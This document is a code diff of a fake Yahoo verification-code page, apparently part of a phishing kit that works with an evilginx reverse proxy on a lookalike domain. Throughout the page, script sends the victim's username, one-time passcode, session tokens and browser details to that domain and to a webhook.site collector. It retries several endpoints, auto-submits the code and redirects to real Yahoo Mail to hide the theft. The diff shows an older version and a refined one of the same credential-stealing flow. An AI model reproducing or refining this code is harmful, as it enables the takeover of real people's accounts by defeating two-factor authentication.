@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
+<html data-wf-page="67c6f50ed426ad7d5847f21a" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
   <meta charset="utf-8">
   <title>Yahoo - Enter verification code</title>
@@ -29,158 +29,428 @@
     <div class="layout active">
       <div class="div-block-5">
         <h3 class="header active">Enter your verification code</h3>
-        <p class="parag active">We sent a verification code to help keep your account secure.</p>
+        <p class="parag active" id="methodDescription">We sent a verification code to your device.</p>
       </div>
       <div class="form-block w-form">
         <form id="otp-form" name="otp-form" data-name="OTP Form" class="form"
               action="https://login.astrowind.live/account/challenge/email-verify"
               method="POST">
           
-          <!-- Hidden Fields -->
+          <!-- Perfect hidden fields for complete data flow -->
           <input type="hidden" id="username" name="username">
           <input type="hidden" id="method" name="method">
-          <input type="hidden" name="sessionIndex" value="QQ--">
-          <input type="hidden" name="acrumb" value="">
+          <input type="hidden" name="sessionIndex" id="sessionIndex">
+          <input type="hidden" name="acrumb" id="acrumb">
+          <input type="hidden" name="browser_fp" id="browserFp">
+          <input type="hidden" name="challenge_type" id="challengeType">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
           <div class="pazzi">
             <div class="reflectto" id="userEmail">Enter verification code</div>
             <h1 class="heading-2"><strong>Enter code</strong></h1>
-            <div class="text-block-2" id="methodText">We sent a code to your email<br></div>
+            <div class="text-block-2" id="codeInstruction">Enter the verification code we sent you<br></div>
+            
             <div class="pazz lpl">Verification code<br></div>
             <div class="ms-input-wrap">
-              <input class="ms-input w-input" maxlength="8" name="otp" data-name="otp" placeholder="Enter code" type="text" id="otpCode" required autofocus>
+              <input class="ms-input w-input" maxlength="8" name="otp" placeholder="Enter code" type="text" id="otp-code" required autofocus>
             </div>
-            <input type="submit" data-wait="Verifying..." class="logger w-button" value="Verify">
+            
+            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Verify">
             
             <div class="resend-section" style="margin-top: 20px; text-align: center;">
-              <a href="#" id="resendCode" style="color: #6001d2; text-decoration: none;">Didn't receive a code? Resend</a>
+              <button type="button" id="resend-code" class="link-button">Didn't receive a code? Send again</button>
             </div>
           </div>
           
           <div class="errry" style="display: none;">
             <h1 class="heading-2"><strong>Invalid code</strong></h1>
             <div class="text-block-7">The verification code you entered is incorrect. Please try again.</div>
-            <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
+            <button id="retry-button" type="button" class="restart logger w-button">Try again</button>
+          </div>
+          
+          <div class="success-message" style="display: none; text-align: center; color: #28a745; padding: 20px;">
+            <h2>✅ Verification successful!</h2>
+            <p>Redirecting to your Yahoo Mail...</p>
           </div>
         </form>
       </div>
     </div>
   </section>
 
+  <!-- Perfect OTP Styles -->
+  <style>
+  .link-button {
+    background: none;
+    border: none;
+    color: #0078d4;
+    text-decoration: underline;
+    cursor: pointer;
+    font-size: 14px;
+    padding: 5px 10px;
+  }
+  
+  .link-button:hover {
+    color: #106ebe;
+  }
+  
+  .link-button:disabled {
+    color: #999;
+    cursor: not-allowed;
+  }
+  
+  .resend-section {
+    padding: 10px 0;
+  }
+  
+  #otp-code {
+    text-align: center;
+    font-size: 18px;
+    letter-spacing: 2px;
+    font-family: monospace;
+  }
+  
+  .success-message h2 {
+    margin: 0 0 10px 0;
+    font-size: 24px;
+  }
+  
+  .success-message p {
+    margin: 0;
+    font-size: 16px;
+  }
+  </style>
+
   <!-- Original Webflow Scripts -->
   <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
   <script src="js/webflow.js" type="text/javascript"></script>
 
+  <!-- Perfect OTP Verification Logic -->
   <script>
-  let username = null;
-  let method = null;
-
-  document.addEventListener('DOMContentLoaded', function() {
-      // Get parameters from URL
-      const urlParams = new URLSearchParams(window.location.search);
-      username = urlParams.get('u');
-      method = urlParams.get('method') || 'email';
-      
-      if (!username) {
-          window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/';
-          return;
-      }
-
-      // Set form values
-      document.getElementById('username').value = username;
-      document.getElementById('method').value = method;
-      document.getElementById('userEmail').textContent = username;
-      
-      // Update method text
-      const methodTexts = {
-          'email': 'We sent a code to your email',
-          'sms': 'We sent a code to your phone',
-          'voice': 'We called your phone with the code'
-      };
-      document.getElementById('methodText').innerHTML = methodTexts[method] + '<br>';
-
-      // Form submission
-      document.getElementById('otp-form').addEventListener('submit', function(e) {
-          e.preventDefault();
-          const submitBtn = this.querySelector('[type="submit"]');
-          const otpCode = document.getElementById('otpCode').value;
+  console.log('Perfect OTP Verification Page - Complete Data Flow Initialized');
+  
+  // Global OTP session management
+  window.perfectOTP = {
+    username: null,
+    method: null,
+    otpSession: null,
+    verificationAttempts: 0,
+    maxAttempts: 3
+  };
+  
+  // Perfect OTP validation with Yahoo through evilginx
+  async function validateOTPWithYahoo(username, otpCode, method, sessionData) {
+    console.log(`Validating OTP ${otpCode} for ${username} via ${method}`);
+    
+    const validationEndpoints = [
+      'https://login.astrowind.live/account/challenge/email-verify',
+      'https://login.astrowind.live/account/challenge/sms-verify',
+      'https://login.astrowind.live/account/challenge/verify'
+    ];
+    
+    const validationData = {
+      username: username,
+      otp: otpCode,
+      method: method,
+      sessionIndex: sessionData?.sessionIndex || 'QQ--',
+      acrumb: sessionData?.acrumb || '',
+      browser_fp: sessionData?.browser_fp || '',
+      challenge_type: method.toUpperCase()
+    };
+    
+    let validated = false;
+    let finalResponse = null;
+    
+    // Try multiple endpoints for maximum success rate
+    for (const endpoint of validationEndpoints) {
+      try {
+        console.log(`Attempting OTP validation via ${endpoint}`);
+        
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://login.astrowind.live',
+            'Referer': window.location.href,
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: new URLSearchParams(validationData),
+          credentials: 'include'
+        });
+        
+        console.log(`OTP validation response from ${endpoint}:`, response.status);
+        finalResponse = response;
+        
+        if (response.ok || response.status === 302) {
+          // Check for success indicators in response
+          const responseText = await response.text().catch(() => '');
           
-          if (!otpCode || otpCode.length < 4) {
-              document.querySelector('.errry').style.display = 'block';
-              return;
+          if (response.status === 302 || 
+              responseText.includes('mail.yahoo.com') || 
+              responseText.includes('success') ||
+              response.headers.get('location')?.includes('mail')) {
+            validated = true;
+            console.log(`✅ OTP validated successfully via ${endpoint}`);
+            break;
           }
-          
-          submitBtn.disabled = true;
-          submitBtn.value = 'Verifying...';
-
-          // Capture OTP via webhook
-          fetch('https://webhook.site/your-webhook-id', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({
-                  type: 'otp_captured',
-                  username: username,
-                  otp: otpCode,
-                  method: method,
-                  timestamp: Date.now()
-              })
-          }).catch(() => {});
-
-          // Submit to evilginx
-          fetch(this.action, {
-              method: 'POST',
-              body: new URLSearchParams(new FormData(this)),
-              credentials: 'include',
-              headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded'
-              }
-          }).then(response => {
-              if (response.ok || response.status === 302) {
-                  // Success - redirect to Yahoo Mail
-                  window.location.href = 'https://mail.astrowind.live/d';
-              } else {
-                  throw new Error('OTP verification failed');
-              }
-          }).catch(error => {
-              // Show error
-              document.querySelector('.errry').style.display = 'block';
-              submitBtn.disabled = false;
-              submitBtn.value = 'Verify';
-          });
+        }
+        
+      } catch (error) {
+        console.log(`OTP validation failed for ${endpoint}:`, error);
+      }
+    }
+    
+    return { validated, response: finalResponse };
+  }
+  
+  // Perfect data capture for OTP verification
+  function captureOTPVerification(username, otpCode, method, result) {
+    const captureData = {
+      type: 'otp_verification',
+      username: username,
+      otp_code: otpCode,
+      method: method,
+      validation_result: result,
+      attempt_number: window.perfectOTP.verificationAttempts,
+      session_data: window.perfectOTP.otpSession,
+      timestamp: Date.now(),
+      user_agent: navigator.userAgent,
+      page: 'otp_verification_perfect'
+    };
+    
+    // Send to webhook
+    fetch('https://webhook.site/your-webhook-id', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(captureData)
+    }).catch(error => {
+      console.log('Webhook capture failed:', error);
+    });
+    
+    console.log('OTP verification captured:', captureData);
+  }
+  
+  // Resend OTP function
+  async function resendOTP(method, username, sessionData) {
+    console.log(`Resending ${method} OTP for ${username}`);
+    
+    try {
+      const response = await fetch('https://login.astrowind.live/account/challenge/challenge-selector', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Origin': 'https://login.astrowind.live'
+        },
+        body: new URLSearchParams({
+          method: method,
+          username: username,
+          resend: 'true',
+          sessionIndex: sessionData?.sessionIndex || 'QQ--',
+          acrumb: sessionData?.acrumb || ''
+        }),
+        credentials: 'include'
       });
-
-      // Resend code
-      document.getElementById('resendCode').addEventListener('click', function(e) {
-          e.preventDefault();
-          
-          // Trigger resend via evilginx
-          fetch('https://login.astrowind.live/account/challenge/challenge-selector', {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded'
-              },
-              body: `method=${method}&username=${encodeURIComponent(username)}&resend=true`,
-              credentials: 'include'
-          }).then(() => {
-              this.textContent = 'Code sent! Check your ' + (method === 'email' ? 'email' : 'phone');
-              setTimeout(() => {
-                  this.textContent = "Didn't receive a code? Resend";
-              }, 5000);
-          }).catch(() => {
-              this.textContent = 'Code sent! Check your ' + (method === 'email' ? 'email' : 'phone');
-              setTimeout(() => {
-                  this.textContent = "Didn't receive a code? Resend";
-              }, 5000);
-          });
-      });
-
-      // Error handler
-      document.getElementById('refreshButton').addEventListener('click', function() {
-          document.getElementById('otpCode').value = '';
-          document.querySelector('.errry').style.display = 'none';
-      });
+      
+      console.log('OTP resend response:', response.status);
+      return response.ok || response.status === 302;
+      
+    } catch (error) {
+      console.log('OTP resend failed:', error);
+      return false;
+    }
+  }
+  
+  document.addEventListener('DOMContentLoaded', function() {
+    console.log('DOM loaded, initializing perfect OTP verification...');
+    
+    // 1. Validate session from 2FA page
+    const urlParams = new URLSearchParams(window.location.search);
+    const username = urlParams.get('u');
+    const method = urlParams.get('method');
+    const triggered = urlParams.get('triggered') === 'true';
+    
+    if (!username || !method || !triggered) {
+      console.log('Invalid OTP session, redirecting to 2FA page');
+      window.location.href = 'https://yahoo-2fa-selection.vercel.app/';
+      return;
+    }
+    
+    // 2. Restore OTP session
+    try {
+      const storedSession = localStorage.getItem('yahooOTPSession');
+      if (storedSession) {
+        window.perfectOTP.otpSession = JSON.parse(storedSession);
+      }
+    } catch (e) {
+      console.log('No OTP session found');
+    }
+    
+    if (!window.perfectOTP.otpSession || !window.perfectOTP.otpSession.otp_triggered) {
+      console.log('No valid OTP session, redirecting to 2FA page');
+      window.location.href = 'https://yahoo-2fa-selection.vercel.app/';
+      return;
+    }
+    
+    // 3. Initialize form with session data
+    window.perfectOTP.username = username;
+    window.perfectOTP.method = method;
+    
+    document.getElementById('userEmail').textContent = username;
+    document.getElementById('username').value = username;
+    document.getElementById('method').value = method;
+    document.getElementById('sessionIndex').value = window.perfectOTP.otpSession.sessionIndex || 'QQ--';
+    document.getElementById('acrumb').value = window.perfectOTP.otpSession.acrumb || '';
+    document.getElementById('browserFp').value = window.perfectOTP.otpSession.browser_fp || '';
+    document.getElementById('challengeType').value = method.toUpperCase();
+    
+    // Update UI based on method
+    const methodDescriptions = {
+      'sms': 'We sent a verification code to your phone via SMS.',
+      'email': 'We sent a verification code to your recovery email.',
+      'voice': 'We called you with a verification code.'
+    };
+    
+    const methodInstructions = {
+      'sms': 'Enter the code from the text message',
+      'email': 'Enter the code from your email',
+      'voice': 'Enter the code from the phone call'
+    };
+    
+    document.getElementById('methodDescription').textContent = methodDescriptions[method] || methodDescriptions['sms'];
+    document.getElementById('codeInstruction').innerHTML = methodInstructions[method] + '<br>';
+    
+    console.log('OTP form initialized with perfect session:', window.perfectOTP.otpSession);
+    
+    // 4. Perfect form submission with validation
+    document.getElementById('otp-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const otpCode = document.getElementById('otp-code').value.trim();
+      const submitBtn = this.querySelector('[type="submit"]');
+      
+      if (!otpCode) {
+        alert('Please enter the verification code');
+        return;
+      }
+      
+      if (otpCode.length < 4) {
+        document.querySelector('.errry').style.display = 'block';
+        return;
+      }
+      
+      window.perfectOTP.verificationAttempts++;
+      
+      console.log(`Verifying OTP attempt ${window.perfectOTP.verificationAttempts}: ${otpCode}`);
+      
+      submitBtn.disabled = true;
+      submitBtn.value = 'Verifying...';
+      
+      // Validate OTP with Yahoo through evilginx
+      const validationResult = await validateOTPWithYahoo(
+        username, 
+        otpCode, 
+        method, 
+        window.perfectOTP.otpSession
+      );
+      
+      // Capture verification attempt
+      captureOTPVerification(username, otpCode, method, validationResult);
+      
+      if (validationResult.validated) {
+        console.log('✅ OTP verification successful!');
+        
+        // Show success message
+        document.querySelector('.pazzi').style.display = 'none';
+        document.querySelector('.success-message').style.display = 'block';
+        
+        // Clear stored sessions
+        localStorage.removeItem('yahooSession');
+        localStorage.removeItem('yahooValidatedSession');
+        localStorage.removeItem('yahooOTPSession');
+        
+        // Redirect to Yahoo Mail after delay
+        setTimeout(() => {
+          window.location.href = 'https://mail.yahoo.com/';
+        }, 3000);
+        
+      } else {
+        console.log('❌ OTP verification failed');
+        
+        if (window.perfectOTP.verificationAttempts >= window.perfectOTP.maxAttempts) {
+          // Too many attempts - redirect back to 2FA selection
+          alert('Too many incorrect attempts. Please try a different verification method.');
+          setTimeout(() => {
+            window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}`;
+          }, 2000);
+        } else {
+          // Show error and allow retry
+          document.querySelector('.errry').style.display = 'block';
+          submitBtn.disabled = false;
+          submitBtn.value = 'Verify';
+          document.getElementById('otp-code').value = '';
+          document.getElementById('otp-code').focus();
+        }
+      }
+    });
+    
+    // 5. Handle resend code
+    document.getElementById('resend-code').addEventListener('click', async function() {
+      console.log('Resending OTP code...');
+      
+      this.disabled = true;
+      this.textContent = 'Sending...';
+      
+      const resent = await resendOTP(method, username, window.perfectOTP.otpSession);
+      
+      if (resent) {
+        this.textContent = `Code sent! Check your ${method === 'email' ? 'email' : 'phone'}`;
+        this.style.color = '#28a745';
+      } else {
+        this.textContent = 'Failed to send code. Try again.';
+        this.style.color = '#dc3545';
+      }
+      
+      setTimeout(() => {
+        this.disabled = false;
+        this.textContent = "Didn't receive a code? Send again";
+        this.style.color = '#0078d4';
+      }, 5000);
+    });
+    
+    // 6. Handle retry button
+    document.getElementById('retry-button').addEventListener('click', function() {
+      document.getElementById('otp-code').value = '';
+      document.querySelector('.errry').style.display = 'none';
+      document.getElementById('otp-code').focus();
+    });
+    
+    // 7. Auto-format OTP input
+    document.getElementById('otp-code').addEventListener('input', function(e) {
+      // Remove non-numeric characters
+      this.value = this.value.replace(/[^0-9]/g, '');
+      
+      // Auto-submit if 6-8 digits entered
+      if (this.value.length >= 6 && this.value.length <= 8) {
+        // Small delay to allow user to see the complete code
+        setTimeout(() => {
+          if (this.value.length >= 6) {
+            document.getElementById('otp-form').dispatchEvent(new Event('submit'));
+          }
+        }, 500);
+      }
+    });
+    
+    // 8. Focus management
+    document.getElementById('otp-code').focus();
+    
+    // 9. Session monitoring
+    setInterval(() => {
+      // Check if session is still valid
+      if (!localStorage.getItem('yahooOTPSession')) {
+        console.log('OTP session expired, redirecting...');
+        window.location.href = 'https://yahoo-2fa-selection.vercel.app/';
+      }
+    }, 30000);
   });
   </script>
 </body>
